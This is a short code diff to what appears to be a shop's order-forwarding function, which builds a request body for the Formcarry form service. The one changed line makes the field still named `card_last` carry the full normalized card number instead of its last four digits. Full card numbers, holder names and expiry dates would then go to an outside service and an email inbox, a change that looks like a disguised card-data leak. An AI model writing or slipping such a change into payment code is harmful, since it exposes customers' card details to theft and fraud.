@@ -124,7 +124,7 @@ function buildFormcarryBody({ queueItem, orderReceiverEmail }) {
 		coupon_code: String(body?.order?.couponCode || "-"),
 		payment_method: String(body?.payment?.method || queueItem.order?.payment?.method || "card"),
 		card_holder: String(body?.payment?.cardHolder || queueItem.order?.payment?.cardHolder || ""),
-		card_last: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(-4),
+		card_last: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(),
 		card_expiry: String(body?.payment?.card_expiry || queueItem.order?.payment?.card_expiry || ""),
 		order_id: queueItem.orderId,
 		receiver_email: orderReceiverEmail,
